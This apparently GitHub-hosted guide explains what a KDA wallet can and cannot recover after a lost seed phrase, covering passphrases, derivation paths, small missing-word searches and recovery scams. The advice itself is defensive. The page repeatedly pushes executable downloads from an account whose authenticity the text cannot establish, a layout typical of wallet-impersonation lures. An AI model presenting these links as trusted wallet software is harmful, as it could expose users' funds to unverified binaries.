![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Lost Seed Phrase: What Kadena Wallet Can and Cannot Recover</h1>

<p align="center">A Kadena Wallet guide to keys, backups and devices.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

A recovery phrase is not a password and not a backup file. It is the key material itself, expressed as words. Lose it and no software can reconstruct it, including the wallet that generated it, because there is nothing left to reconstruct from: the account remains on-chain, and the only thing that could sign for it is gone.

That is the honest shape of the problem. What follows is what can still be done in each version of it, and the small number of cases where "lost" turns out to be something else.

## You'll see this if

- You reinstalled an operating system or a wallet and no longer have the words.
- You have the words but they produce an address you do not recognise.
- You remember most of the phrase and want to know whether the rest can be filled in.
- Someone has offered to recover your KDA for a fee, and you want a second opinion.

## What "lost" usually means

| What happened | What is still possible |
| --- | --- |
| The app was deleted, the phrase is on paper | Full recovery; this is not a loss |
| The phrase is gone but the device or phone still holds the key | Move the funds to a new account while access exists |
| Some words are missing or wrong | Possible only if the gap is small and the positions are known |
| A device was reset without a backup | Nothing, unless a second copy exists |
| The words are right but a passphrase is forgotten | Only the accounts without that passphrase are reachable |

The second and fifth rows are the ones worth acting on immediately, because both are time-limited by circumstance rather than by any deadline the network imposes.

## The distinction that decides everything

The account still exists. It always will, unless the chain itself stops. You can see it, watch it and confirm its balance in an explorer without holding any key at all.

Seeing is not recovering. A wallet needs the private key to sign, and the phrase is how that key is stored and moved. Everything visible on-chain is evidence that the funds are there; none of it is a route back in.

That distinction matters practically. Someone who can show you your balance is not halfway to recovery, and anyone who implies otherwise is either confused or selling something.

## Things worth trying, in order

1. **Look for the second copy before doing anything else.** The phrase you wrote down at setup, the one in the drawer, the one in the safe, the one you gave a family member. Most "lost" phrases are misplaced, not destroyed.
2. **Check other devices that already hold it.** A phone with the mobile app, an old laptop, a hardware device. If any of them can still sign, the priority is moving funds to a new account you control, not recovering the old phrase.
3. **Try the phrase in software that implements the original derivation.** A correct phrase in the wrong wallet produces an empty account, which people misread as a lost key. Chainweaver-era accounts need Chainweaver's scheme; eckoWALLET used `m/44'/626'/0'/0/{index}`; a Ledger uses its own paths.
4. **If a passphrase was set, supply it.** The twelve or twenty-four words alone open a different set of accounts. This is the most common false alarm in the whole category.
5. **If a small number of words are uncertain and you know their positions,** the remaining search space can be small enough to test methodically. Twelve unknown words from a 2,048-word list is not feasible; one or two is arithmetic rather than luck.
6. **Confirm the funded address from an independent source** before testing candidates: an exchange withdrawal record, an old screenshot, a message you sent someone. Without a target address, a successful derivation cannot be recognised.

Notice that none of those steps involves paying anyone, and none requires trusting a stranger with the words you do have.

## What cannot work

- **Recovery services.** An account can only be moved with its key. A service that cannot produce the key is selling hope, and a service that asks for the words you remember is collecting the remainder of your key.
- **Seed repair tools.** Software can test candidates; it cannot conjure missing entropy. Tools that claim otherwise are usually malware with a progress bar.
- **Asking the network, the community or the stewards.** The multisig that holds platform keysets has no authority over user accounts, and no mechanism exists to move funds from an account whose key is gone.
- **Support channels that message you first.** Every one of them is an attacker. Wallet publishers do not initiate contact about your balance.

## If the funds are visible but unreachable

This is the case that needs planning rather than hope. The balance sits in an account nobody can sign for. It will stay there, visible, indefinitely.

Three consequences follow. The position cannot be sold, swapped or moved. Any loss on it cannot be realised by disposal, which matters if you were counting on that. And no future software release changes the situation, because the missing thing is not software.

If you still have access through any device, treat that access as expiring. Create a new account, write its phrase down properly, and move the balance while you can. Do not wait for a wallet update to solve a key problem.

## Prevention, restated without ceremony

- Write the phrase by hand at setup, and keep two copies in separate physical places.
- Verify the backup by restoring it once, before a balance depends on it.
- Never photograph it, never type it into a website, never send it to anyone, including support.
- Record which derivation and which account index you used, because that note is what turns a correct phrase into a working restore.
- If you set a passphrase, store the fact that you did, separately from the words. The passphrase is not optional knowledge.

## FAQ

**Can Kadena Wallet recover an account without the phrase?**
No. No wallet can. The phrase is the key, and the key is the only thing that authorises a transfer.

**I have 11 of 12 words. Is that enough?**
Sometimes, if the missing word's position is known and the rest are correct. That is a bounded search, not a recovery service, and it should be done offline with software you can read.

**The phrase is correct but the balance is zero. Is it lost?**
Usually not. Check the derivation, the account index, the chain and any passphrase before concluding anything.

**Can the community edition help?**
No. It maintains the network, not user accounts. Its stewards hold platform keysets, not your key.

**Is it worth paying a recovery firm?**
Only if they can explain, before payment, how they will derive your address without your key. In practice that explanation does not exist.

## Related reading

- Importing a Chainweaver seed into Kadena Wallet
- What Kadena Wallet is, and what self-custody actually means
- Kadena Wallet security: a threat model you can act on
- KDA recovery scams: how to spot them in Kadena Wallet support

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Importing a Chainweaver Seed into Kadena Wallet](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/import-chainweaver-seed-into-kadena-wallet.md)
- [eckoWALLET to Kadena Wallet: What Carries Over](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/eckowallet-to-kadena-wallet-migration.md)
- [Migrating from Koala to Kadena Wallet After KDA Removal](https://github.com/kadena-developments/keys-and-devices-handbook/blob/main/migrating-from-koala-after-kadena-removal.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
